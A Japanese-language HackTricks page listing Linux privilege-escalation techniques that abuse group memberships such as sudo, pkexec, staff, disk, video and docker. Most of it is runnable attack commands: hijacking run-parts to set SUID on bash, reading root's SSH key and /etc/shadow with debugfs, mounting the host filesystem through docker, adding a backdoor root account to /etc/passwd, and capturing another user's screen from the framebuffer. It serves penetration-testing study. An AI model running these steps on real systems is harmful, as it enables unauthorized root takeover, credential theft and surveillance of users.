# インタレスティンググループ - Linux Privesc

{% hint style="success" %}
AWSハッキングの学習と練習：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングの学習と練習：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
{% endhint %}

## Sudo/Admin グループ

### **PE - 方法1**

**時々**、**デフォルトで（またはあるソフトウェアが必要とするために）**、**/etc/sudoers**ファイルの中にこれらの行のいくつかを見つけることができます：
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
これは、**sudoまたはadminグループに属するユーザーはsudoとして何でも実行できる**ことを意味します。

この場合、**rootになるには単に実行するだけです**:
```
sudo su
```
### PE - 方法2

すべてのsuidバイナリを見つけ、バイナリ**Pkexec**があるかどうかを確認します：
```bash
find / -perm -4000 2>/dev/null
```
もしバイナリ**pkexecがSUIDバイナリである**ことがわかり、**sudo**または**admin**に所属している場合、おそらく`pkexec`を使用してバイナリをsudoとして実行できるかもしれません。\
これは通常、**polkitポリシー**内にあるグループです。このポリシーは基本的に、どのグループが`pkexec`を使用できるかを識別します。次のコマンドで確認してください：
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
以下では、どのグループが**pkexec**を実行することが許可されているか、そしていくつかのLinuxディストロでは**sudo**と**admin**グループが**デフォルトで**表示されます。

**rootになるには、次のコマンドを実行します**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
もし**pkexec**を実行しようとして、この**エラー**が表示された場合:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**許可がないわけではなく、GUIなしで接続されていないためです**。そして、この問題の回避策がここにあります: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。**異なる2つのsshセッション**が必要です:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Wheel Group

**時々**、**デフォルトで**、**/etc/sudoers**ファイルの中にこの行が見つかることがあります：
```
%wheel	ALL=(ALL:ALL) ALL
```
これは、**wheelグループに属するユーザーはsudoとして何でも実行できる**ことを意味します。

これが当てはまる場合、**rootになるには単に実行するだけです**:
```
sudo su
```
## シャドウグループ

**グループシャドウ**のユーザーは、**/etc/shadow**ファイルを**読む**ことができます。
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
## Staff Group

**staff**: システム（`/usr/local`）へのローカルな変更をルート権限なしで追加できるようにします（`/usr/local/bin`内の実行可能ファイルは任意のユーザーのPATH変数に含まれており、同じ名前の`/bin`および`/usr/bin`内の実行可能ファイルを「上書き」する可能性があります）。監視/セキュリティに関連するグループ「adm」と比較してください。[ソース](https://wiki.debian.org/SystemGroups)

Debianディストリビューションでは、`$PATH`変数は、特権ユーザーであろうとなかろうと、`/usr/local/`が最優先で実行されることを示しています。
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
### Interesting Groups for Linux Privilege Escalation

もし `/usr/local` 内のいくつかのプログラムを乗っ取ることができれば、root 権限を簡単に取得できます。

`run-parts` プログラムを乗っ取ることは root 権限を簡単に取得する方法です。なぜなら、ほとんどのプログラムが `run-parts` を実行するように設定されているからです（crontab や ssh ログイン時など）。
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
または新しいsshセッションログイン時。
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**悪用**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## ディスクグループ

この特権はほぼ**rootアクセスと同等**です。マシン内のすべてのデータにアクセスできます。

ファイル：`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
注意してください。debugfsを使用して**ファイルを書き込む**こともできます。たとえば、`/tmp/asd1.txt`を`/tmp/asd2.txt`にコピーするには、次のようにします：
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
しかし、**root所有のファイルを書き込もうとすると**（たとえば `/etc/shadow` や `/etc/passwd`）、**Permission denied** エラーが発生します。

## Video Group

コマンド `w` を使用すると、**システムにログインしているユーザー**を見つけることができ、次のような出力が表示されます。
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**は、ユーザー**yossiがマシンの端末に物理的にログイン**していることを意味します。

**videoグループ**は、画面出力を表示する権限を持っています。基本的に、画面を観察することができます。そのためには、画面上の現在のイメージを生データで取得し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存でき、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**Rawイメージ**を**開く**には、**GIMP**を使用して、\*\*`screen.raw` \*\*ファイルを選択し、ファイルタイプとして**Raw image data**を選択します：

![](<../../../.gitbook/assets/image (463).png>)

次に、画面で使用されている幅と高さを変更し、さまざまな画像タイプを確認します（画面をよりよく表示するものを選択します）：

![](<../../../.gitbook/assets/image (317).png>)

## ルートグループ

デフォルトでは、**ルートグループのメンバー**は、**サービス**の構成ファイルや**ライブラリ**ファイル、または特権を昇格させるのに使用できる**その他の興味深いもの**をいくつか**変更**する権限を持っているようです...

**ルートメンバーが変更できるファイルを確認**してください：
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker グループ

インスタンスのボリュームにホストマシンのルートファイルシステムをマウントすることができます。したがって、インスタンスが起動するとすぐにそのボリュームに `chroot` がロードされます。これにより、実質的にマシンで root 権限を取得できます。
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
## lxc/lxd グループ

[lxc/lxd グループ](./)

## Adm グループ

通常、**`adm`** グループの**メンバー**は _/var/log/_ 内にある**ログファイルを読む**権限を持っています。\
したがって、このグループ内のユーザーが侵害された場合は、**ログを確認**する必要があります。

## Auth グループ

OpenBSD内では、**auth** グループは通常、使用されている場合は _**/etc/skey**_ と _**/var/db/yubikey**_ のフォルダに書き込むことができます。\
これらの権限は、次のエクスプロイトを使用して悪用され、root権限に**昇格**する可能性があります: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
